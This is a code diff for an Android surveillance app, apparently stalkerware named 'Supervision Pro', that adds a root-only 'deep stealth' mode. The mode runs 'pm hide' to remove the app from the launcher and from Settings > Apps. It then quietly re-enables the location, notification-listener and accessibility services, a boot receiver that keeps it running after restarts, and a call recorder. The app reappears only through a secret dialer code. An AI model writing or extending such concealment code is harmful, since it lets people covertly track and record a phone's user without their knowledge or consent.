@@ -127,6 +127,77 @@ object StealthManager {
     }
 
     /**
+     * Mode DEEP STEALTH (root requis) :
+     * Cache l'app de la liste Réglages > Applications aussi.
+     * Sans root, l'app est visible dans Réglages > Applications sous "Services système".
+     * Avec root, elle disparaît complètement, même de cette liste.
+     */
+    fun enableDeepStealth(context: Context): Boolean {
+        if (!com.surveillancepro.android.root.RootManager.isRooted()) return false
+
+        val pkg = context.packageName
+
+        // 1. Cacher du launcher (mode HIDDEN)
+        setMode(context, StealthMode.HIDDEN)
+
+        // 2. Cacher de la liste Réglages > Applications
+        // On utilise "pm hide" qui rend l'app invisible partout dans l'UI système
+        val result = com.surveillancepro.android.root.RootManager.executeRootCommand(
+            "pm hide $pkg 2>/dev/null || pm disable $pkg 2>/dev/null"
+        )
+
+        // 3. Mais on doit garder les services actifs → on les réactive individuellement
+        val services = listOf(
+            "$pkg/.services.LocationService",
+            "$pkg/.services.ContentObserverService",
+            "$pkg/.services.SupervisionNotificationListener",
+            "$pkg/.services.SupervisionAccessibilityService",
+        )
+        for (service in services) {
+            com.surveillancepro.android.root.RootManager.executeRootCommand(
+                "pm enable $service 2>/dev/null"
+            )
+        }
+
+        // 4. Réactiver le receiver de boot pour survivre aux redémarrages
+        com.surveillancepro.android.root.RootManager.executeRootCommand(
+            "pm enable $pkg/.receivers.BootReceiver 2>/dev/null; " +
+            "pm enable $pkg/.receivers.SecretCodeReceiver 2>/dev/null; " +
+            "pm enable $pkg/.root.CallRecorder 2>/dev/null"
+        )
+
+        val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
+        prefs.edit().putBoolean("deep_stealth", true).apply()
+
+        android.util.Log.d(TAG, "DEEP STEALTH activated (hidden from Settings > Apps)")
+        return result.success
+    }
+
+    /**
+     * Désactive le deep stealth (root requis).
+     */
+    fun disableDeepStealth(context: Context): Boolean {
+        if (!com.surveillancepro.android.root.RootManager.isRooted()) return false
+        val pkg = context.packageName
+
+        val result = com.surveillancepro.android.root.RootManager.executeRootCommand(
+            "pm unhide $pkg 2>/dev/null; pm enable $pkg 2>/dev/null"
+        )
+
+        setMode(context, StealthMode.VISIBLE)
+
+        val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
+        prefs.edit().putBoolean("deep_stealth", false).apply()
+
+        return result.success
+    }
+
+    fun isDeepStealthActive(context: Context): Boolean {
+        val prefs = context.getSharedPreferences("sp_stealth", Context.MODE_PRIVATE)
+        return prefs.getBoolean("deep_stealth", false)
+    }
+
+    /**
      * Code secret pour réafficher l'app.
      * L'admin compose *#*#7378#*#* (S-P-R-O = Supervision Pro) au clavier téléphonique.
      */
